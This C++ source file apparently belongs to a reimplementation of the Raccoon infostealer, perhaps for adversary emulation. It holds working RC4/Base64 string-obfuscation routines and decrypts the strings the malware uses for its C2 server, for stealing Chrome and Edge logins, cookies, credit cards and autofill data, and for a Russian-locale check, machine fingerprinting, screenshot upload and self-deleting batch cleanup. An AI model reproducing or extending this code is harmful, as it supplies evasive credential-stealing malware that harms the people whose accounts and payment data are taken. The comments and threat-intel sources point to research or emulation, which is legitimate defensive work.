#include "obfuscation.h"


/**
* All strings are already encrypted and encoded, stored in vars.cpp so this only
* includes the decrypt/decode functions
* 
* If you swap any of those strings out, use CyberChef / the provided utility
* to RC4 and then Base64 encode. If you use CyberChef, it's the straight
* RC4 and not the RC4 Drop. And if you're new to CyberChef, any line breaks or
* tabs should be entered literally and not with break characters (e.g. \n). Those
* get literally encrypted and don't cause the expected behavior.
*/

string decodeB64(const string& input) {
    DWORD outLen = 0;
    if (!g_racCryptStringToBinaryA(input.c_str(), input.size(), CRYPT_STRING_BASE64, nullptr, &outLen, nullptr, nullptr)) {
        //throw std::runtime_error("CryptStringToBinaryA failed");
    }

    std::string output(outLen, 0);
    if (!g_racCryptStringToBinaryA(input.c_str(), input.size(), CRYPT_STRING_BASE64, reinterpret_cast<BYTE*>(&output[0]), &outLen, nullptr, nullptr)) {
        //throw std::runtime_error("CryptStringToBinaryA failed");
    }

    return output;
}


bool decryptRC4(wstring& encData, const string& key) {
    BCRYPT_ALG_HANDLE hAlgorithm;
    BCRYPT_KEY_HANDLE hKey;
    DWORD dwDataLen = 0;
    DWORD dwResultLen = 0;

    string tmpEnc = decodeB64(string(encData.begin(), encData.end()));

    if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RC4_ALGORITHM, nullptr, 0) != 0) {
        //cerr << "Error: Failed to open algorithm provider." << endl;
        return false;
    }

    // Generate the key object from the supplied key
    if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, nullptr, 0, (PBYTE)key.c_str(), static_cast<ULONG>(key.length()), 0) != 0) {
        //cerr << "Error: Failed to generate symmetric key." << endl;
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    // Get the size of decrypted data
    if (BCryptDecrypt(hKey, (PBYTE)tmpEnc.c_str(), static_cast<ULONG>(tmpEnc.length()), nullptr, nullptr, 0, nullptr, 0, &dwResultLen, 0) != 0) {
        //cerr << "Error: Failed to decrypt data." << endl;
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    // Decrpyt the data
    string decData(dwResultLen, '\0');
    if (BCryptDecrypt(hKey, (PBYTE)tmpEnc.c_str(), static_cast<ULONG>(tmpEnc.length()), nullptr, nullptr, 0, (PBYTE)decData.data(), dwResultLen, &dwResultLen, 0) != 0) {
        //cerr << "Error: Failed to decrypt data." << endl;
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return false;
    }

    // Clean up
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    decData.resize(dwResultLen);

    encData = wstring(decData.begin(), decData.end());

    return true;
}

/**
* Raccoon RC4 encrypts and base64 encodes every string literal used in the
* program, excluding (oddly) function names when resolving their addresses.
*
* These strings get decrypted at the initial outset of the execution cycle.
*
* Sources:
* - Sekoia
* - Anyrun
* - Zscaler
* - Infosec Writeup
*
*/
int debofuscateStrings() {

    //Folder and C2 Vars
    if (!decryptRC4(g_localLowPath, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_stagingFolder, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_server, g_StrRC4Key)) return -1;

    // Single char vars
    if (!decryptRC4(g_spaceChar, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_leftParen, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_rightParen, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_newLineChar, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_backSlash, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_forwardSlash, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_quote, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_asterisk, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_asteriskWithSlash, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_dot, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_doubleDot, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_pipe, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_dash, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_comma, g_StrRC4Key)) return -1;

    // System privs check
    if (!decryptRC4(g_sid, g_StrRC4Key)) return -1;

    // Browser dump
    if (!decryptRC4(g_defaultWebData, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_webdata, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_defaultLoginData, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_LoginData, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_defaultNetworkCookies, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_cookies, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_column_blob, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_open, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_prepare_v2, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_finalize, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_close, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_step, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_column_bytes, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_column_text, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlite3_errmsg, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_localState, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_encrypted_key, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_select_from_logins, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_looted_logins, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_url, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_username, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_password, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_select_from_cookies, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_looted_cookies, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_hostkey, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_name, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_value, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_select_from_credit_cards, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_name_2, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_expiration, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_append_cc, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_select_from_autofill, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_looted_ccs, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_looted_autofill, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_sqlitedll, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_google_chrome_user_data, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_chrome, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_microsoft_edge_user_data, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_edge, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_browser_theft, g_StrRC4Key)) return -1;

    // File up/download
    if (!decryptRC4(g_content_disposition, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_content_type, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_content_type_2, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_cache_control, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_POST, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_recieved, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_GET, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_userAgent, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_doubleDash, g_StrRC4Key)) return -1;

    // Initial checks and checkin
    if (!decryptRC4(g_mutexValue, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_ru_lang, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_checkin_machineID, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_checkin_configID, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_checkin_headers, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_reg_open_Cryptography, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_reg_query_MachineGUID, g_StrRC4Key)) return -1;

    // Config parsing
    if (!decryptRC4(g_config_libs_regex, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_config_grbr_regex, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_config_scrnsht_regex, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_config_token_regex, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_config_libs, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_config_grbr, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_config_scrnsht, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_config_token, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_folderShortcutParser, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_userProfile, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_publicPath, g_StrRC4Key)) return -1;

    // Cleanup actions
    if (!decryptRC4(g_clsid, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_hastalavista, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_recyclebin, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_exe, g_StrRC4Key)) return -1;

    // Bat file
    if (!decryptRC4(g_batPartOne, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_batPartTwo, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_batPartThree, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_batPartFour, g_StrRC4Key)) return -1;

    // Screenshot
    if (!decryptRC4(g_ScreenshotPath, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_screenshotUploadName, g_StrRC4Key)) return -1;

    // fingerprinting
    if (!decryptRC4(g_systemInfoFilePath, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_systemInfoUploadName, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_xChar, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_x86, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_x64, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_MB, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_unknownLiteral, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_osError, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_regCurrentVersion, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_productNameKey, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_processorError, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_coresWithParen, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_localeError, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_regUninstall, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_displayNameKey, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_displayVersionKey, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_indent, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_indent2, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_systemInfoFormat, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_localeFormat, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_timeZoneFormat, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_archFormat, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_cpuFormat, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_ramFormat, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_displaySizeFormat, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_displayDevicesFormat, g_StrRC4Key)) return -1;
    if (!decryptRC4(g_installedAppsFormat, g_StrRC4Key)) return -1;

    // Browser theft fake data for exfil over http
    if (!decryptRC4(g_browserTheft, g_StrRC4Key)) return -1;

    return 0;
}